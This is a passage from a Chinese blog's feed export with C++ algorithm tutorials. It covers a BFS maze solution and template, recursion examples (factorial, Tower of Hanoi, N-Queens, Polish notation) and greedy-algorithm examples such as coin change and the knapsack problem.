class="line">&#123;</span><br><span class="line">cout&lt;&lt;t.s&lt;&lt;zimu[i]&lt;&lt;endl;<span class="comment">//注意也要将zimu[i]一并输出因为此时它还没有被加到t.s</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">visited[tx][ty]=<span class="number">1</span>;</span><br><span class="line">qn.<span class="built_in">push</span>(<span class="built_in">node</span>(tx,ty,t.s+zimu[i]));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;mp[i];</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">bfs</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果为：<br>DDDDRRURRRRRRDRRRRDDDLDDRDDDDDDDDDDDDRDDRRRURRUURRDDDDRDRRRRRRDRRURRDDDRRRRUURUUUUUUULULLUUUURRRRUULLLUUUULLUUULUURRURRURURRRDDRRRRRDDRRDDLLLDDRRDDRDDLDDDLLDDLLLDLDDDLDDRRRRRRRRRDDDDDDRR</p><h1>bfs模板</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;type&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(初始状态);</span><br><span class="line"><span class="keyword">while</span> (!q.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">  type t = q.<span class="built_in">front</span>() ;</span><br><span class="line">  q.<span class="built_in">pop</span>();</span><br><span class="line">  遍历 t 的各个Next状态  next</span><br><span class="line">  &#123; </span><br><span class="line">    <span class="keyword">if</span> (next is legal)</span><br><span class="line">      q.<span class="built_in">push</span>(next的状态); 计数或维护等; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;问题描述&lt;/h1&gt;
&lt;p&gt;下图给出了一个迷宫的平面图，其中标记为 1 的为障碍，标记为 0 的为可 以通行的地方。&lt;/p&gt;
&lt;p&gt;010000&lt;br&gt;
000100&lt;br&gt;
001001&lt;br&gt;
110000&lt;/p&gt;
&lt;p&gt;迷宫的入口为左上角，出口为右下角，在迷宫中，只能</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>递归算法总结</title>
    <link href="https://zss192.github.io/2021/03/26/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>https://zss192.github.io/2021/03/26/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-26T09:49:00.000Z</published>
    <updated>2021-03-30T03:50:05.922Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一个函数调用其自身就是递归，也是利用栈实现，每调用一次进一次栈</p></blockquote><p>注意找到递归的终止条件</p><p>作用</p><ul><li>替代多重循环</li><li>解决本来就是用递归形式定义的问题</li><li>将问题分解规模更小的子问题求解（如求阶乘）</li></ul><h2 id="例题讲解"><a class="header-anchor" href="#例题讲解">¶</a>例题讲解</h2><p>🚩1.阶乘问题</p><p>思路讲解：如我们要求3的阶乘，那我们可以把问题分解成求3乘上2的阶乘，然后还可以再把2的阶乘分解成2乘上1的阶乘。</p><p>现在我们已知digui()这个函数就是求一个数的阶乘的函数，3的阶乘分解成两个小问题，对于2的阶乘我们直接可以用digui(2)就可以求。</p><p>但要注意不能无穷的递归下去，要有一个临界点，到了这个临界点后就可以直接返回不用再接着调用digui()函数了，在这题里，如果要求1的阶乘那么可以直接返回1而不用再接着分解问题了。</p><p>作为基础入门，代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">digui</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> n*<span class="built_in">digui</span>(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🚩2.汉诺塔问题（分解成小问题）</p><p>有 3 根柱子及 N 个不同大小的穿孔圆盘，盘子可以滑入任意一根柱子。一开始，所有盘子自上而下按升序依次套在第一根柱子上(即每一个盘子只能放在更大的盘子上面)。移动圆盘时受到以下限制:<br>(1) 每次只能移动一个盘子;<br>(2) 盘子只能从柱子顶端滑出移到下一根柱子;<br>(3) 盘子只能叠在比它大的盘子上。</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/202103261436302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>思路讲解：比如我们现在要把3个圆盘从塔1移到塔3，那么一定是A先放到塔3最下面，然后B和C再移到塔3，这样的话就要先把B和C移走。</p><p>B和C又不能移到塔3，可以先移到塔2作为中间结点然后再移到塔3。这样要解决3层汉诺塔问题要先解决2层汉诺塔问题即把BC如何移到塔2</p><p>B和C要想移到塔2首先C要先移走且不能移到塔2因为塔2必须是最底下的B先移动，那么BC要从塔1移到塔2就要利用塔3当做中间节点</p><p>这样两层汉诺塔问题就拆解成了两个1层汉诺塔的问题而1层汉诺塔可以直接移动至此解决</p><p>解题步骤：</p><ul><li>第一步<ul><li>把n-1个圆盘 从塔1移动到塔2</li></ul></li><li>第二步<ul><li>把第n个圆盘 从塔1移动到塔3</li></ul></li><li>第三步<ul><li>把n-1个圆盘 从塔2移动到塔3</li></ul></li></ul><p>原理：看到这里是不是觉得和阶乘的解决方法类似</p><ul><li>要想解决n层汉诺塔问题必须解决n-1层汉诺塔问题</li><li>解决n-1层汉诺塔问题必须解决n-2层汉诺塔问题</li><li>…</li><li>必须解决1层汉诺塔问题，而1层可以直接移动。类似于阶乘中如果求1的阶乘那么不用再调用函数可以直接返回</li></ul><p>🦄代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hanoi</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> src,<span class="keyword">char</span> mid,<span class="keyword">char</span> dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)    <span class="comment">//递归结束条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;src&lt;&lt; <span class="string">&quot;-&gt;&quot;</span> &lt;&lt;dest&lt;&lt;endl; <span class="comment">//只有一个盘子时直接移动即可</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Hanoi</span>(n<span class="number">-1</span>,src,dest,mid);        <span class="comment">//第一步，把n-1个圆盘 从塔1移动到塔2</span></span><br><span class="line">    cout&lt;&lt;src&lt;&lt; <span class="string">&quot;-&gt;&quot;</span> &lt;&lt;dest&lt;&lt;endl;  <span class="comment">//第二步, 把第n个圆盘 从塔1移动到塔3</span></span><br><span class="line">    <span class="built_in">Hanoi</span>(n<span class="number">-1</span>,mid,src,dest);        <span class="comment">//第三步，把n-1个圆盘 从塔2移动到塔3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Hanoi(3,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span></span><br><span class="line"><span class="comment">//1-&gt;3  第一步，2个圆盘从塔1移到塔2</span></span><br><span class="line"><span class="comment">//1-&gt;2</span></span><br><span class="line"><span class="comment">//3-&gt;2  第一步结束</span></span><br><span class="line"><span class="comment">//1-&gt;3  第二步，到这塔1移到了塔3</span></span><br><span class="line"><span class="comment">//2-&gt;1  第三步，2个圆盘从塔2移到塔3</span></span><br><span class="line"><span class="comment">//2-&gt;3</span></span><br><span class="line"><span class="comment">//1-&gt;3  第三步结束</span></span><br></pre></td></tr></table></figure><blockquote><p>把问题拆解分成几个小步骤，而对于n-1个圆盘的移动直接调用函数改下参数即可</p></blockquote><p><a href="http://player.bilibili.com/player.html?aid=753044588&amp;bvid=BV1Hk4y1k7KL&amp;cid=186093717&amp;page=1">http://player.bilibili.com/player.html?aid=753044588&amp;bvid=BV1Hk4y1k7KL&amp;cid=186093717&amp;page=1</a></p><p>🚩3.[蓝桥杯][算法提高VIP]最大乘积（替代多重循环）</p><p>对于n个数，从中取出m个数，如何取使得这m个数的乘积最大呢？</p><p><strong>输入</strong></p><p>第一行一个数表示数据组数每组输入数据共2行：第1行给出总共的数字的个数n和要取的数的个数m，1&lt;=n&lt;=m&lt;=15，第2行依次给出这n个数，其中每个数字的范围满足:a[i]的绝对值小于等于4。</p><p><strong>输出</strong></p><p>每组数据输出1行，为最大的乘积。</p><p><strong>样例输入</strong></p><p><code>1 5 5 1 2 3 4 2</code></p><p><strong>样例输出</strong></p><p><code>48</code></p><p>思路：用递归代替多重循环(因为不知道有几重)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> maxn=<span class="number">-1e8</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> sum,<span class="keyword">int</span> step)</span>   <span class="comment">//x记录起始搜寻位置，sum记录当前乘积，step记录当前找了几个数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(step==m)</span><br><span class="line">    &#123;</span><br><span class="line">        maxn=<span class="built_in">max</span>(maxn,sum);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(vis[i]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            vis[i]=<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">dfs</span>(i+<span class="number">1</span>,sum*a[i],step+<span class="number">1</span>);</span><br><span class="line">            vis[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            cin&gt;&gt;a[i];</span><br><span class="line">        <span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        cout&lt;&lt;maxn&lt;&lt;endl;</span><br><span class="line">        maxn=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>🚩4.N皇后问题（替代多重循环）</p><p>在N×N格的国际象棋上摆放N个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。</p><p>思路讲解：可以递归来求解，尝试每种解法，如果都不冲突就输出这种解法</p><p>对于第k行的皇后依次遍历所放位置i和前k-1行已经摆好的皇后判断是否冲突。</p><p>若在同一列那所放位置和之前某个皇后的列位置相同，若斜线冲突，那两个冲突的皇后行的差值和列的差值的绝对值相同</p><p>🦄代码如下（本质上是N重循环只不过用递归代替）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="keyword">int</span> queenPos[<span class="number">100</span>];  <span class="comment">//第i行的皇后放在哪一列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NQueen</span><span class="params">(<span class="keyword">int</span> k)</span>  <span class="comment">//在1~k-1行皇后已经摆好的情况下，摆第k行及其后的皇后</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==N+<span class="number">1</span>)    <span class="comment">//N个皇后已经摆好，此时输出摆法</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;queenPos[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N; i++) <span class="comment">//逐个尝试第k行皇后的列位置i</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="comment">//和已经摆好的前k个皇后的位置比较，看是否冲突</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; k; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(queenPos[j]==i || <span class="built_in">abs</span>(queenPos[j]-i)==<span class="built_in">abs</span>(k-j))</span><br><span class="line">                <span class="keyword">break</span>;  <span class="comment">//冲突，尝试下一个位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==k)    <span class="comment">//当前选的列位置i不冲突（只有不冲突上面的for循环才不会break）</span></span><br><span class="line">        &#123;</span><br><span class="line">            queenPos[k]=i; <span class="comment">//将第k个皇后摆放在列位置i</span></span><br><span class="line">            <span class="built_in">NQueen</span>(k+<span class="number">1</span>);</span><br><span class="line">        &#125;     </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;N;</span><br><span class="line">    <span class="built_in">NQueen</span>(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🚩5.逆波兰表达式（递归解决递归形式的问题）</p><p>如2 + 3用逆波兰表达式为+ 2 3，（2+3）* 4表示为* + 2 3 4，本题求逆波兰表达式的值</p><p>输入：* + 11.0 12.0 + 24.0 35.0</p><p>输出：1357.000000</p><p>提示：(11.0+12.0)*(24.0+35.0)</p><p>思路：首先来看逆波兰表达式的定义</p><ul><li>一个数就是一个逆波兰表达式，值为该数</li><li>&quot;运算符 逆波兰表达式 逆波兰表达式&quot;也是逆波兰表达式</li></ul><p>从上面的逆波兰表达式的定义可以看到定义中又出现了逆波兰表达式这不就和递归一样吗，自身又用到了自身</p><p>而显然终止条件就是一个数的情况</p><p>🦄代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">exp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;    <span class="comment">//cin遇到空格会停止</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (s[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> <span class="built_in">exp</span>()+<span class="built_in">exp</span>();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> <span class="built_in">exp</span>()-<span class="built_in">exp</span>();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> <span class="built_in">exp</span>()*<span class="built_in">exp</span>();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">return</span> <span class="built_in">exp</span>()/<span class="built_in">exp</span>();</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> <span class="built_in">stod</span>(s);   <span class="comment">//stod函数将字符串类型转换为double类型</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">exp</span>()&lt;&lt;endl;    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// + 2 3</span></span><br><span class="line"><span class="comment">// 首先读入+然后case &#x27;+&#x27;执行return exp()+exp()</span></span><br><span class="line"><span class="comment">//第一个exp()也会执行cin&gt;&gt;s;这时的s是2直接return stod(&quot;2&quot;)</span></span><br><span class="line"><span class="comment">//第二个exp()也会执行cin&gt;&gt;s;这时的s是2直接return stod(&quot;3&quot;)</span></span><br><span class="line"><span class="comment">//然后二者返回了2和3再执行加法操作返回5输出</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;一个函数调用其自身就是递归，也是利用栈实现，每调用一次进一次栈&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意找到递归的终止条件&lt;/p&gt;
&lt;p&gt;作用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;替代多重循环&lt;/li&gt;
&lt;li&gt;解决本来就是用递归形式定义的问题&lt;/li</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>贪心算法总结</title>
    <link href="https://zss192.github.io/2021/03/26/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>https://zss192.github.io/2021/03/26/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-26T07:48:00.000Z</published>
    <updated>2021-03-30T03:49:08.433Z</updated>
    
    <content type="html"><![CDATA[<p>优点：简单，高效，省去了为了找最优解可能需要穷举操作，通常作为其它算法的辅助算法来使用；</p><p>缺点：不从总体上考虑其它可能情况，每次选取局部最优解，不再进行回溯处理，所以很少情况下得到最优解。</p><blockquote><p>每一步都选取当前状态下最好的选择(局部最优)。(整体不一定是最优解)<br>助记：贪心即比较贪婪只注重&quot;眼前利益&quot;不能长远考虑</p></blockquote><p>正是因为原问题太复杂无法直接得到全局最优解，所以也无法判定贪心算法得到的结果是否逼近全局最优解，只要最终得到的结果在接受范围内即可</p><h2 id="例题案例"><a class="header-anchor" href="#例题案例">¶</a>例题案例</h2><blockquote><p>注：以下两个案例均不能得到最优解，只能得到近似最优解，案例只是解释思想</p></blockquote><h3 id="1-找零钱问题"><a class="header-anchor" href="#1-找零钱问题">¶</a>1.找零钱问题</h3><p>假设你开了间小店，不能电子支付，钱柜里的货币只有 25 分、10 分、5 分和 1 分四种硬币，如果你是售货员且要找给客户 41 分钱的硬币，如何安排才能找给客人的钱既正确且硬币的个数又最少？</p><p>思路：如果用贪心算法求解</p><p>要找给顾客41分且硬币数最少，那么大数值的硬币数越多越好。先用一个25分的，41-25=16。</p><p>然后根据局部最优当找零为16时从25，10，5，1中选一个，我们可以选10，16-10=6</p><p>找零数为6时从25，10，5，1中选一个，我们可以选5，6-5=1，以此类推</p><blockquote><p>我们可以看到当做出一个选择后，然后相当于以现在的状态为起始状态，再次做出选择</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*<span class="keyword">int</span>* money=<span class="number">41</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num_25=<span class="number">0</span>,num_10=<span class="number">0</span>,num_5=<span class="number">0</span>,num_1=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不断尝试每一种硬币</span></span><br><span class="line"><span class="keyword">while</span>(money&gt;=<span class="number">25</span>) &#123; num_25++; money -=<span class="number">25</span>; &#125;</span><br><span class="line"><span class="keyword">while</span>(money&gt;=<span class="number">10</span>) &#123; num_10++; money -=<span class="number">10</span>; &#125;</span><br><span class="line"><span class="keyword">while</span>(money&gt;=<span class="number">5</span>)  &#123; num_5++;  money -=<span class="number">5</span>; &#125;</span><br><span class="line"><span class="keyword">while</span>(money&gt;=<span class="number">1</span>)  &#123; num_1++;  money -=<span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">cout&lt;&lt; <span class="string">&quot;25分硬币数：&quot;</span>&lt;&lt;num_25&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt; <span class="string">&quot;10分硬币数：&quot;</span>&lt;&lt;num_10&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt; <span class="string">&quot;5分硬币数：&quot;</span>&lt;&lt;num_5&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt; <span class="string">&quot;1分硬币数：&quot;</span>&lt;&lt;num_1&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*25分硬币数：1</span></span><br><span class="line"><span class="comment">10分硬币数：1</span></span><br><span class="line"><span class="comment">5分硬币数：1</span></span><br><span class="line"><span class="comment">1分硬币数：1*/</span></span><br></pre></td></tr></table></figure><h3 id="2-01背包问题"><a class="header-anchor" href="#2-01背包问题">¶</a>2.01背包问题</h3><p>有一个背包，最多能承载重量为 C=150的物品，现在有7个物品（物品不能分割成任意大小），编号为 1~7。</p><p>重量分别是 wi=[35,30,60,50,40,10,25]，价值分别是 pi=[10,40,30,50,35,40,30]。</p><p>现在从这 7 个物品中选择一个或多个装入背包，要求在物品总重量不超过 C 的前提下，所装入的物品总价值最高。</p><p>思路：若用贪心算法，有3种策略</p><ol><li>价值主导选择，每次都选价值最高的物品放进背包；</li><li>重量主导选择，每次都选择重量最轻的物品放进背包；</li><li>价值密度主导选择，每次选择都选价值/重量最高的(性价比最高的)物品放进背包。</li></ol><p>策略1：每次优先选价值最高的</p><p>解：按照价值排序则放入背包的编号依次为4、2、6、5。</p><p>其价值为50+40+40+35=165，其重量为50+30+10+40=130</p><p>策略2：每次优先选重量最轻的</p><p>解：按照重量最轻则放入的编号依次为6、7、2、1、5</p><p>其价值为40+30+40+10+35=155，其重量为10+25+30+35+40=140</p><p>策略3：每次优先选价值/重量最大的</p><p>解：这7件物品的价值密度分别为0.286、1.333、0.5、1.0、0.875、4.0、1.2</p><p>所以放入的编号依次为6、2、7、4、1</p><p>其价值为40+40+30+50+10=170，其重量为10+30+25+50+35=150</p><h2 id="LeetCode习题"><a class="header-anchor" href="#LeetCode习题">¶</a>LeetCode习题</h2><p>🚩1.题目1221分割平衡字符串问题</p><p>在一个 平衡字符串 中，‘L’ 和 ‘R’ 字符的数量是相同的。给你一个平衡字符串 s，请你将它分割成尽可能多的平衡字符串。</p><p>注意：分割得到的每个字符串都必须是平衡字符串。返回可以通过分割得到的平衡字符串的最大数量 。</p><blockquote><p>输入：s = “RLRRLLRLRL”<br>输出：4<br>解释：s 可以分割为 “RL”、“RRLL”、“RL”、“RL” ，每个子字符串中都包含相同数量的 ‘L’ 和 ‘R’ 。</p></blockquote><p>解：用变量balance(初始为0)记录扫描到的L和R的数目，遇到L则balance+1否则减1当其为0的时候说明当前找到了平衡子串</p><p>上一次划分后balance=0，剩下的平衡子串接着用上述思想（贪心思想）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">balancedStringSplit</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> len=s.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">int</span> balance=<span class="number">0</span>,result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    